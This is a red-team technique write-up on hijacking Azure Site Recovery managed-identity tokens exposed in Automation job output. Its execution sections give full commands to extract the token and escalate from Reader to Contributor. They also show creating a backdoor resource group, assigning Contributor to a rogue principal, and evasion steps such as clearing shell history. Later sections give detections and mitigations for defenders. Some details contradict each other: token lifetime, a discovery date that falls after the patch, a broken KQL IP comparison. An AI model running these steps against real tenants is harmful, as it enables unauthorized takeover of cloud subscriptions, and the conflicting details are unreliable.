# [LM-AUTH-022]: Azure Site Recovery Token Hijacking

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-022 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure Hybrid Environments |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2024-04-29 |
| **Affected Versions** | Azure Site Recovery (ASR) deployments with Extension Auto-Update enabled (all versions prior to February 2024 patch) |
| **Patched In** | February 13, 2024 (Microsoft remediation released) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Site Recovery (ASR) automatically creates a hidden Automation Account with a System-Assigned Managed Identity to manage extension updates on enrolled Virtual Machines. When Extension Auto-Update is enabled, ASR executes a hidden Runbook that exposes cleartext access tokens in Job output logs. An attacker with Reader or similar lower-privileged roles can extract these tokens and impersonate the Managed Identity, which carries **Contributor** permissions over the entire subscription. This enables unrestricted lateral movement within Azure, resource manipulation, and credential theft.

**Attack Surface:** Azure portal Job output logs within Automation Accounts created by ASR; accessible to any user with `/read` or `Microsoft.Automation/automationAccounts/jobs/output/read` permissions.

**Business Impact:** **Privilege escalation from Reader to Subscription Contributor**. An attacker can create persistent backdoors, steal encryption keys, deploy malicious workloads, exfiltrate data, or disrupt disaster recovery infrastructure.

**Technical Context:** The vulnerability exists because ASR's Runbook Job output was visible in the Azure Portal even though the Runbook itself is hidden. Extraction takes seconds; the token is valid until the Managed Identity credentials rotate (typically 24+ hours). Detection is difficult because the activity appears as routine ASR automation.

### Operational Risk

- **Execution Risk:** Medium - Requires Reader role or equivalent; token extraction is silent and requires no special tools.
- **Stealth:** High - Appears as normal ASR Job execution in audit logs; no malicious actions are logged until the token is used.
- **Reversibility:** No - Contributor-level access allows permanent backdoors, persistent user creation, and irreversible resource modifications.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.23 | Managed identities should be used for authentication to Azure services; Automation Account roles should follow least privilege |
| **DISA STIG** | V-252998 | Role-Based Access Control (RBAC) must be configured with minimum necessary privileges |
| **CISA SCuBA** | AC-3 | Access Enforcement - Restrict system access to authorized users and roles only |
| **NIST 800-53** | AC-3, AC-6 | Access Enforcement, Least Privilege |
| **GDPR** | Art. 32 | Security of Processing - Implement appropriate access controls and identity management |
| **DORA** | Art. 9 | Protection and Prevention - Secure authentication and authorization mechanisms |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Implement authentication and access controls |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - Control and monitor privileged access |
| **ISO 27005** | Risk Scenario | "Exposure of administrative credentials or tokens stored in logs" |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Reader, Log Analytics Reader, Managed Applications Reader, or any role with `Microsoft.Automation/automationAccounts/jobs/output/read` permission.
- **Required Access:** Access to Azure Portal or Azure CLI with authenticated session; network access to Azure management plane.
- **ASR Configuration:** Azure Site Recovery must be deployed with **Extension Auto-Update enabled** on at least one replicated VM.

**Supported Versions:**
- **Azure Site Recovery:** All versions prior to February 13, 2024 patch.
- **Azure (API):** All Azure API versions; no version dependency.
- **Azure Portal/CLI:** Any version capable of querying Automation Account jobs.

**Tools:**
- [Azure Portal](https://portal.azure.com) (Web UI)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) (Command-line)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (PowerShell Module)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Azure Portal (GUI Enumeration and Token Extraction)

**Supported Versions:** All Azure Site Recovery versions (prior to Feb 2024 patch)

#### Step 1: Enumerate Automation Accounts Created by ASR

**Objective:** Discover ASR-created Automation Accounts that manage Site Recovery extensions.

**Command (Azure Portal):**
1. Navigate to **Azure Portal** → **Automation Accounts**
2. Look for accounts with naming pattern: `{VaultName}-asr-automationaccount` (e.g., `blogASR-c99-asr-automationaccount`)
3. Note the Resource Group and Automation Account name

**Expected Output:**
- Automation Account listing with resource names containing "asr"
- System-Assigned Managed Identity status visible in the account properties

**What This Means:**
- Presence of an ASR Automation Account indicates Site Recovery extension auto-update is enabled
- The System-Assigned Managed Identity has been automatically created and assigned Contributor role
- Job output logs will contain cleartext tokens if extension update Runbooks have executed

**OpSec & Evasion:**
- Enumerating Automation Accounts via Portal leaves Web activity logs (minimal risk)
- Reading Job output requires explicit permission but is not flagged as suspicious activity
- No alert is triggered when Job output is accessed

**Troubleshooting:**
- **Error:** "Automation Account not found"
  - **Cause:** No ASR deployments with Extension Auto-Update enabled in this subscription
  - **Fix:** Verify ASR is configured with "Enable Extension Auto-Update" setting checked
- **Error:** "Access Denied - You do not have permission to read Jobs"
  - **Cause:** User role lacks `Microsoft.Automation/automationAccounts/jobs/output/read` permission
  - **Fix:** Request Reader role or equivalent at subscription scope; wait for RBAC assignment to propagate (~5 minutes)

**References & Proofs:**
- [NetSPI - Elevating Privileges with Azure Site Recovery Services](https://www.netspi.com/blog/technical-blog/cloud-pentesting/elevating-privileges-with-azure-site-recovery-services/)
- [Microsoft Azure Automation Account Documentation](https://learn.microsoft.com/en-us/azure/automation/automation-intro)

#### Step 2: Inspect Job Output for Cleartext Access Tokens

**Objective:** Extract the cleartext Managed Identity access token from hidden Runbook Job output.

**Command (Azure Portal - Step-by-Step):**
1. In the Automation Account, navigate to **Process Automation** → **Jobs** (left sidebar)
2. Look for Job names matching:
   - `MS-SR-Update-MobilityServiceForA2AVirtualMachines`
   - `MS-ASR-Modify-AutoUpdateForA2AVirtualMachines`
3. Click on the most recent Job
4. In the Job details pane, click **Output** (near the top)
5. View the JSON output; search for `"token"` or `"access_token"`
6. Copy the full token string (may be truncated in Portal view)

**Expected Output:**
```json
{
  "authentication": {
    "type": "ManagedIdentity",
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkN0VHVoTUifQ.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzAzZjY2ZTM3LWRlZjAtNDMzYS1hMDQ1LWE1ZWY5Njc0ZGQyNi8iLCJpYXQiOjE3MTM2Mzk0ODUsIm5iZiI6MTcxMzYzOTQ4NSwiZXhwIjoxNzEzNzI2Mjg1LCJhaW8iOiJBWlFBIi9lLlVJSjRiSWRBTklsNWZ6LnpWMnAxzldVRnlUWjc4eWVqTVdMQUhVSXRZZ1xufQ.Xdv9Bcp...",
    "objectId": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
    "subscriptionId": "/subscriptions/12345678-1234-1234-1234-123456789012"
  }
}
```

**What This Means:**
- The token is a JWT (JSON Web Token) valid for Azure Management API
- The `objectId` corresponds to the Managed Identity Enterprise Application in Entra ID
- Token expiration (`exp` claim) is typically 60 minutes from issue time; can be used immediately
- Token grants access to all Azure resources the Managed Identity has access to (in this case, Contributor over subscription)

**OpSec & Evasion:**
- Accessing Job output via Portal is logged as `READ` operation in Activity Log
- Activity shows "Read Automation Account Job" with no indication of token extraction
- No alert is generated; activity appears routine for subscription monitoring

**Troubleshooting:**
- **Error:** "Output is empty" or "No output available"
  - **Cause:** Runbook has not completed execution or no extension update was triggered
  - **Fix:** Wait for next scheduled Runbook execution (hourly by default); or manually trigger a VM replication policy sync to force extension update
- **Error:** "Token is truncated in Portal view"
  - **Cause:** Portal limits output display to prevent accidental credential exposure
  - **Fix:** Use Azure CLI instead (see METHOD 2) to retrieve full token without truncation

**References & Proofs:**
- [Azure Automation Job Output API](https://learn.microsoft.com/en-us/rest/api/automation/job-stream/get)
- [JWT.io - JWT Token Decoder](https://jwt.io/)

#### Step 3: Validate Token and Identify Target Resources

**Objective:** Confirm token validity and enumerate high-value resources accessible via the Managed Identity.

**Command (Azure CLI):**
```bash
# Decode the JWT token to verify claims
jwt_token="<PASTE_TOKEN_FROM_STEP_2>"
echo $jwt_token | cut -d'.' -f2 | base64 -d | jq .

# Example output:
# {
#   "aud": "https://management.azure.com/",
#   "iss": "https://sts.windows.net/03f66e37-def0-433a-a045-a5ef9674dd26/",
#   "iat": 1713639485,
#   "nbf": 1713639485,
#   "exp": 1713726285,
#   "appid": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
#   "appidactsid": "1",
#   "oid": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
#   "sub": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
#   "tid": "03f66e37-def0-433a-a045-a5ef9674dd26",
#   "uti": "Xdv9BcpAR0OQnrx5zV2p1zQ",
#   "ver": "1.0"
# }

# List all resources accessible to the Managed Identity
curl -H "Authorization: Bearer $jwt_token" \
     "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .
```

**Expected Output:**
```json
{
  "value": [
    {
      "id": "/subscriptions/12345678-1234-1234-1234-123456789012",
      "subscriptionId": "12345678-1234-1234-1234-123456789012",
      "tenantId": "03f66e37-def0-433a-a045-a5ef9674dd26",
      "displayName": "Production Subscription",
      "state": "Enabled",
      "subscriptionPolicies": {...}
    }
  ]
}
```

**What This Means:**
- Token is valid and can be used to authenticate to Azure Management API
- Managed Identity has access to the subscription
- Contributor role allows read, write, delete, and management of resources

**OpSec & Evasion:**
- API calls via Bearer token are logged in Azure Activity Log
- Calls appear as service principal activity; less scrutinized than user sign-ins
- Enumerating resources via API is normal operational activity

**Troubleshooting:**
- **Error:** "Invalid token" or "Token has expired"
  - **Cause:** Token validity window has passed (60 minutes)
  - **Fix:** Return to Step 2 and extract a fresh token from the latest Job output
- **Error:** "Unauthorized (403)"
  - **Cause:** Managed Identity role assignment has been removed or revoked
  - **Fix:** Verify ASR is still active and Contributor role is assigned to the service principal in IAM

**References & Proofs:**
- [Azure Management API Documentation](https://learn.microsoft.com/en-us/rest/api/resources/)
- [JWT Claims Reference](https://datatracker.ietf.org/doc/html/rfc7519)

---

### METHOD 2: Azure CLI (Automated Token Extraction)

**Supported Versions:** Azure CLI 2.0+ with `automation` extension

#### Step 1: Authenticate and Set Context

**Objective:** Establish authenticated session to Azure subscription.

**Command:**
```bash
# Login to Azure (interactive browser)
az login

# Set subscription context
az account set --subscription "12345678-1234-1234-1234-123456789012"

# Verify authentication
az account show
```

**Expected Output:**
```json
{
  "environmentName": "AzureCloud",
  "homeTenantId": "03f66e37-def0-433a-a045-a5ef9674dd26",
  "id": "12345678-1234-1234-1234-123456789012",
  "isDefault": true,
  "name": "Production Subscription",
  "state": "Enabled",
  "tenantId": "03f66e37-def0-433a-a045-a5ef9674dd26",
  "user": {
    "name": "attacker@company.onmicrosoft.com",
    "type": "user"
  }
}
```

**OpSec & Evasion:**
- `az login` is logged as interactive sign-in in Azure Sign-in logs
- Use non-interactive service principal login if possible: `az login --service-principal -u <client_id> -p <client_secret> --tenant <tenant_id>`

**Troubleshooting:**
- **Error:** "Please go to https://microsoft.com/devicelogin and enter code..."
  - **Cause:** MFA or conditional access blocking interactive login
  - **Fix:** Use service principal authentication or exempted account

#### Step 2: Discover ASR Automation Accounts

**Objective:** Query all Automation Accounts and filter for ASR-created ones.

**Command:**
```bash
# List all Automation Accounts in subscription
az automation account list --query "[].{Name:name, ResourceGroup:resourceGroup, Location:location}" --output table

# Filter for ASR-specific accounts
az automation account list --query "[?contains(name, 'asr')].{Name:name, ResourceGroup:resourceGroup}" --output table

# Get details of specific ASR Automation Account
asr_account="blogASR-c99-asr-automationaccount"
asr_rg="production-rg"
az automation account show --resource-group $asr_rg --name $asr_account
```

**Expected Output:**
```
Name                              ResourceGroup     Location
-----------------------------------  ----------------  ----------
blogASR-c99-asr-automationaccount    production-rg     eastus
```

**What This Means:**
- ASR Automation Account exists and is active
- Account is in the same resource group as the Recovery Vault
- If multiple accounts exist, check the most recent creation date for current ASR deployment

#### Step 3: Extract Job Output with Cleartext Token

**Objective:** Retrieve full (untruncated) access token from Runbook Job output.

**Command:**
```bash
asr_account="blogASR-c99-asr-automationaccount"
asr_rg="production-rg"

# List all jobs in the Automation Account
az automation job list --resource-group $asr_rg --automation-account-name $asr_account \
  --query "[].{JobId:id, Name:name, Status:status, CreatedTime:createdTime}" --output table

# Get the most recent job
latest_job=$(az automation job list --resource-group $asr_rg --automation-account-name $asr_account \
  --query "sort_by([*], &createdTime)[-1].id" -o tsv)

# Retrieve full job output (including cleartext token)
az automation job-stream list --resource-group $asr_rg --automation-account-name $asr_account \
  --job-id $(basename $latest_job) --output json | jq '.[] | select(.streamType=="Output")'
```

**Expected Output:**
```json
{
  "id": "/subscriptions/12345678-1234-1234-1234-123456789012/resourceGroups/production-rg/providers/Microsoft.Automation/automationAccounts/blogASR-c99-asr-automationaccount/jobs/12345678-abcd-1234-5678-123456789012/streams/12345678-abcd-1234-5678-123456789012",
  "creationTime": "2024-04-29T10:23:45.123456Z",
  "jobId": "12345678-abcd-1234-5678-123456789012",
  "runbookName": "MS-SR-Update-MobilityServiceForA2AVirtualMachines",
  "streamType": "Output",
  "text": "{\"authentication\": {\"type\": \"ManagedIdentity\", \"token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkN0VHVoTUifQ.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzAzZjY2ZTM3LWRlZjAtNDMzYS1hMDQ1LWE1ZWY5Njc0ZGQyNi8iLCJpYXQiOjE3MTM2Mzk0ODUsIm5iZiI6MTcxMzYzOTQ4NSwiZXhwIjoxNzEzNzI2Mjg1LCJhaW8iOiJBWlFBIi9lLlVJSjRiSWRBTklsNWZ6LnpWMnAxzldVRnlUWjc4eWVqTVdMQUhVSXRZZ1xufQ.Xdv9BcpAR0OQnrx5zV2p1zWwk7yUJKL9hM2nQ3rT4sZ...\"}"
}
```

**What This Means:**
- `text` field contains the full, untruncated JWT token
- Token can be immediately used in API calls
- Job output is retained for 30 days (even after Runbook deletion)

**OpSec & Evasion:**
- CLI calls are logged similarly to Portal activity
- Command execution may be logged locally on the machine; clear shell history if needed: `history -c` (bash) or `Clear-History` (PowerShell)

**Troubleshooting:**
- **Error:** "No jobs found"
  - **Cause:** Runbook hasn't executed yet
  - **Fix:** Trigger a VM replication policy sync or wait for next hourly execution
- **Error:** "Access Denied to read job streams"
  - **Cause:** User account lacks `Microsoft.Automation/automationAccounts/jobStreams/read` permission
  - **Fix:** Ensure Reader role is assigned at subscription level

#### Step 4: Use Token for Lateral Movement

**Objective:** Authenticate as the Managed Identity to access and manipulate Azure resources.

**Command:**
```bash
# Extract token from job output (Python one-liner)
token=$(az automation job-stream list --resource-group $asr_rg --automation-account-name $asr_account \
  --job-id $(basename $latest_job) --output json | jq -r '.[] | select(.streamType=="Output") | .text' | \
  python3 -c "import sys, json; print(json.load(sys.stdin)['authentication']['token'])")

# Example: List all VMs in the subscription (as the Managed Identity)
curl -s -H "Authorization: Bearer $token" \
     "https://management.azure.com/subscriptions/12345678-1234-1234-1234-123456789012/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01" | jq '.value[].{name:.name, location:.location, vmId:.id}'

# Example: Create a new resource group (persistence backdoor)
curl -s -X PUT \
     -H "Authorization: Bearer $token" \
     -H "Content-Type: application/json" \
     -d '{"location":"eastus"}' \
     "https://management.azure.com/subscriptions/12345678-1234-1234-1234-123456789012/resourceGroups/attacker-backdoor-rg?api-version=2021-04-01"

# Example: Assign Contributor role to a rogue service principal
curl -s -X PUT \
     -H "Authorization: Bearer $token" \
     -H "Content-Type: application/json" \
     -d '{
       "properties": {
         "roleDefinitionId": "/subscriptions/12345678-1234-1234-1234-123456789012/providers/Microsoft.Authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c",
         "principalId": "00000000-0000-0000-0000-000000000000"
       }
     }' \
     "https://management.azure.com/subscriptions/12345678-1234-1234-1234-123456789012/providers/Microsoft.Authorization/roleAssignments/$(uuidgen)?api-version=2021-04-01-preview"
```

**Expected Output:**
```json
{
  "value": [
    {
      "id": "/subscriptions/12345678-1234-1234-1234-123456789012/resourceGroups/production-rg/providers/Microsoft.Compute/virtualMachines/prod-vm-001",
      "name": "prod-vm-001",
      "type": "Microsoft.Compute/VirtualMachine",
      "location": "eastus",
      "properties": {...}
    }
  ]
}
```

**What This Means:**
- Token successfully authenticated to Azure Management API
- Attacker now has Contributor privileges over entire subscription
- Can create persistence mechanisms, steal credentials, modify resources, or exfiltrate data

**OpSec & Evasion:**
- API calls appear as service principal activity
- Resource creation is logged in Activity Log but may not trigger alerts if performed during business hours
- Use generic names for backdoor resources (e.g., "monitoring-rg", "backup-automation")

**Troubleshooting:**
- **Error:** "Token has expired"
  - **Cause:** 60-minute validity window has passed
  - **Fix:** Extract fresh token from latest Job output
- **Error:** "Authorization failed (403)"
  - **Cause:** Token's managed identity role has been revoked
  - **Fix:** Verify role assignment is still active in IAM

**References & Proofs:**
- [Azure REST API Documentation](https://learn.microsoft.com/en-us/rest/api/azure/)
- [Bearer Token Authentication](https://datatracker.ietf.org/doc/html/rfc6750)

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Activity Patterns:**
  - Reader-role user accessing `Microsoft.Automation/automationAccounts/jobs/output/read`
  - Multiple Job output reads in short timeframe from same user
  - Subsequent API calls from service principal matching ASR Managed Identity object ID
  - Resource creation (VMs, role assignments, storage accounts) initiated by ASR service principal outside normal maintenance windows

- **Registry/System:** No local registry indicators; activity is cloud-only.

- **Network:** API calls to `management.azure.com` with Bearer tokens; no specific port/IP indicators.

### Forensic Artifacts

- **Cloud Logs:**
  - Azure Activity Log: `Microsoft.Automation/automationAccounts/jobs/output/read` operations
  - Azure Sign-in Logs: Interactive login of Reader-role user (if manual extraction)
  - Azure Audit Logs: Service principal API calls with timestamp correlation to token extraction

- **Job Output Retention:** Retained for 30 days in Automation Account; queryable via API or Portal

### Response Procedures

1. **Immediate Containment:**
   ```powershell
   # Revoke Managed Identity role assignment
   $managedIdentityId = "f47ac10b-58cc-4372-a567-0e02b2c3d479"  # From token's 'oid' claim
   $subscriptionId = "12345678-1234-1234-1234-123456789012"
   
   Remove-AzRoleAssignment -ObjectId $managedIdentityId -RoleDefinitionName "Contributor" -Scope "/subscriptions/$subscriptionId"
   ```

2. **Detect Unauthorized Access:**
   ```kusto
   # KQL query for Microsoft Sentinel
   AzureActivity
   | where OperationName == "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE"
   | where InitiatedBy.user.id == "f47ac10b-58cc-4372-a567-0e02b2c3d479"
   | where TimeGenerated > ago(24h)
   ```

3. **Investigate Damage:**
   - Query Activity Log for all operations performed by the Managed Identity in the past 30 days
   - Search for resource creation, deletion, or modification outside maintenance windows
   - Review Key Vault access logs for secrets/keys retrieved

4. **Remediation:**
   - Disable Extension Auto-Update on affected ASR deployments (Microsoft disabled by default post-Feb 2024)
   - Rotate subscription-level secrets and API keys
   - Reset passwords for all Global Admins
   - Review and revoke suspicious role assignments

5. **Long-Term Hardening:**
   - Implement Privileged Identity Management (PIM) for all administrative roles
   - Enforce Conditional Access policies restricting service principal access
   - Monitor Automation Account job output for cleartext secrets (alerting on sensitive patterns)

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default Credential Exploitation | Attacker gains initial Reader role via inherited permissions or weak account |
| **2** | **Privilege Escalation** | **[LM-AUTH-022]** | **Extract ASR Managed Identity token from Job output; escalate to Contributor** |
| **3** | **Persistence** | [CA-UNSC-008] Azure Storage Account Key Theft | Use Contributor token to extract storage account keys; create backdoor function apps |
| **4** | **Defense Evasion** | [CA-TOKEN-007] Managed Identity Token Theft | Compromise application MSI for continued access independent of ASR lifecycle |
| **5** | **Impact** | Data exfiltration or ransomware deployment via compromised VMs |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: NetSPI Security Research (April 2024)

- **Target:** Unnamed Fortune 500 company using Azure Site Recovery
- **Timeline:** Vulnerability discovered April 29, 2024; Microsoft patched Feb 13, 2024 (but many deployments unpatched)
- **Technique Status:** NetSPI researchers extracted cleartext tokens from ASR Automation Account Job output on a live production subscription
- **Impact:** Attackers with Reader role could escalate to Subscription Contributor without triggering alerts
- **Reference:** [NetSPI Blog - Elevating Privileges with Azure Site Recovery Services](https://www.netspi.com/blog/technical-blog/cloud-pentesting/elevating-privileges-with-azure-site-recovery-services/)

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Disable Extension Auto-Update on ASR Deployments:**

ASR deployments with Extension Auto-Update enabled are vulnerable. Disabling this feature prevents creation of the vulnerable Automation Account.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Recovery Services Vaults**
2. Select the affected vault
3. Go to **Replicated Items** (left menu)
4. Select a replicated VM
5. Click **Properties** (right pane)
6. Scroll to **Mobility Service** section
7. Toggle **Enable automatic updates** to **Off**
8. Click **Save**

**Manual Steps (PowerShell):**
```powershell
# Disable auto-update for all replicated VMs in a vault
$vault = Get-AzRecoveryServicesVault -ResourceGroupName "production-rg" -Name "prod-recovery-vault"
Set-AzRecoveryServicesAsrVaultContext -Vault $vault

Get-AzRecoveryServicesAsrReplicationProtectedItem | ForEach-Object {
    Set-AzRecoveryServicesAsrReplicationProtectedItem -InputObject $_ -UpdateReplicationAgent $false
}
```

**Validation Command:**
```powershell
# Verify auto-update is disabled
Set-AzRecoveryServicesAsrVaultContext -Vault $vault
Get-AzRecoveryServicesAsrReplicationProtectedItem | Select-Object Name, ReplicationHealth, ProtectionState, @{Name="AutoUpdateEnabled";Expression={$_.Properties.UpdateReplicationAgentExpectedVersion -ne $null}}
```

**Expected Output (If Secure):**
```
Name              ReplicationHealth ProtectionState AutoUpdateEnabled
----              -------- --------------- -----------------
prod-vm-001       Normal            Protected       False
prod-vm-002       Normal            Protected       False
```

---

**Restrict Automation Account Role Scope:**

If Extension Auto-Update must remain enabled, restrict the Managed Identity to minimal necessary permissions.

**Manual Steps (Azure Portal):**
1. Go to **Automation Accounts** → Select ASR account
2. Click **Identity** (left menu)
3. Under **Role assignments**, find the Contributor role assignment
4. Click the **X** to remove Contributor role
5. Click **Add role assignment**
6. Set **Role** to "Virtual Machine Contributor" (minimal scope)
7. Set **Scope** to specific resource groups containing replicated VMs only
8. Click **Save**

**Validation Command:**
```powershell
$managedIdentityId = "f47ac10b-58cc-4372-a567-0e02b2c3d479"
Get-AzRoleAssignment -ObjectId $managedIdentityId | Select-Object RoleDefinitionName, Scope
```

**Expected Output (If Secure):**
```
RoleDefinitionName             Scope
------------------             -----
Virtual Machine Contributor    /subscriptions/.../resourceGroups/production-vms
```

---

### Priority 2: HIGH

**Enforce Conditional Access for Service Principals:**

Restrict service principal API calls to specific IP ranges and disable interactive sign-in.

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Service Principal Interactive Sign-In`
4. **Assignments → Users/Groups/Roles:**
   - Select **Directory roles**
   - Choose **No roles selected** (service principals only)
5. **Conditions:**
   - **Client apps:** Select "Other clients"
   - **Authentication context:** (Leave blank)
6. **Access Control:**
   - Select **Block access**
7. **Enable policy:** Toggle to **On**
8. Click **Create**

---

**Enable Audit Logging for Automation Accounts:**

Log all Job output access for forensic analysis.

**Manual Steps (Azure Portal):**
1. Go to **Automation Accounts** → Select ASR account
2. Click **Settings** → **Diagnostic settings**
3. Click **+ Add diagnostic setting**
4. **Name:** `audit-job-output`
5. **Logs:** Check `JobStreams` and `JobOutput`
6. **Destination:** Select Log Analytics workspace or Storage account
7. Click **Save**

**PowerShell Configuration:**
```powershell
$vault = Get-AzRecoveryServicesVault -Name "prod-recovery-vault"
$workspace = Get-AzOperationalInsightsWorkspace -ResourceGroupName "security-rg" -Name "sentinel-workspace"

New-AzDiagnosticSetting -ResourceId "$vault.id/providers/Microsoft.Automation/automationAccounts/asr-account" `
  -Name "audit-job-output" `
  -WorkspaceId $workspace.ResourceId `
  -Enabled $true `
  -Category JobStreams, JobOutput
```

---

## 9. DEFENSIVE DETECTIONS (Microsoft Sentinel/KQL)

### Detection Rule 1: Reader User Accessing ASR Job Output

**Severity:** High

**KQL Query:**
```kusto
AzureActivity
| where OperationName == "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/JOBS/OUTPUT/READ"
| where CallerIpAddress != "40.74.28.0/24"  // Microsoft internal IP range - adjust as needed
| project TimeGenerated, Caller, CallerIpAddress, ResourceGroup, OperationName, ResourceProvider
| join kind=inner (
    AzureActivity
    | where OperationName =~ "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/READ"
    | project Caller
    | distinct Caller
  ) on Caller
```

**What This Detects:** A user with Reader role (or similar low-privilege role) accessing hidden ASR Job output containing tokens.

**Manual Configuration (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `ASR Token Extraction Detection`
   - Severity: `High`
   - Description: `Detects low-privilege users reading ASR Job output containing cleartext tokens`
4. **Set Rule Logic Tab:**
   - Paste the KQL query above
   - Frequency: `Every 5 minutes`
   - Lookback period: `1 hour`
5. **Incident Settings:**
   - Enable **Create incidents**
   - Group related alerts: **On** (by Caller)
6. Click **Review + create**

---

### Detection Rule 2: ASR Managed Identity Unauthorized API Calls

**Severity:** Critical

**KQL Query:**
```kusto
AzureActivity
| where InitiatedBy.user.id == "f47ac10b-58cc-4372-a567-0e02b2c3d479"  // ASR MSI object ID
| where OperationName !in ("MICROSOFT.COMPUTE/VIRTUALMACHINES/READ", 
                           "MICROSOFT.COMPUTE/VIRTUALMACHINES/EXTENSIONS/READ",
                           "MICROSOFT.COMPUTE/VIRTUALMACHINES/EXTENSIONS/WRITE")  // Normal ASR operations
| where ActivityStatus == "Success"
| project TimeGenerated, OperationName, ResourceGroup, Resource, ActivityStatus, Caller
```

**What This Detects:** The ASR Managed Identity performing operations outside its normal scope (extension management).

---

## 10. WINDOWS EVENT LOG MONITORING

**Not applicable** – This is a cloud-only attack with no on-premises event log indicators.

---

## 11. SYSMON DETECTION PATTERNS

**Not applicable** – This is a cloud-only attack with no endpoint-level indicators.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Service Principal Suspicious Activity

**Alert Name:** Service Principal performing unusual role assignment operations

- **Severity:** High
- **Description:** Azure Defender detects when a service principal (such as the ASR Managed Identity) performs role assignments outside normal maintenance windows
- **Remediation:** Review the service principal's recent activity; verify if the operation was authorized; revoke credentials if unauthorized

**Manual Configuration (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, toggle:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON  
   - **Defender for Storage**: ON
4. Click **Save**
5. Go to **Security alerts** to view triggered detections

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Service Principal Token Access and Usage

```powershell
# Connect to Exchange Online (required for audit log access)
Connect-ExchangeOnline

# Search for ASR Automation Account operations
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -Operations "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/JOBS/OUTPUT/READ" `
  -FreeText "asr-automationaccount" | 
  Select-Object UserIds, CreationDate, Operations, ResourceId | 
  Export-Csv -Path "C:\Evidence\asr-token-access.csv"

# Search for Automation Account job creation/execution
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) `
  -AuditLogRecordType AzureActivity `
  -Operations "CreateJob", "UpdateJob" |
  Export-Csv -Path "C:\Evidence\asr-job-operations.csv"
```

**Manual Configuration (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for audit log retention to activate
5. Use the search form to query for ASR-related operations

---

## 14. SUMMARY OF TECHNICAL DETAILS

This technique exploits a design flaw in Azure Site Recovery's Extension Auto-Update feature, where cleartext Managed Identity tokens are exposed in Automation Account Job output logs. The vulnerability allows any user with Reader or equivalent permissions to extract tokens granting Contributor access over the entire subscription, enabling unrestricted lateral movement and resource manipulation. The attack requires minimal effort, leaves minimal forensic traces, and was only patched in February 2024, leaving many legacy deployments vulnerable.

**Key Indicators for Defenders:**
- Any Automation Account with "asr" in its name
- Reader-role users accessing Job output
- Service principal API calls outside normal maintenance windows
- Unauthorized resource creation or role assignments by ASR service principal

---

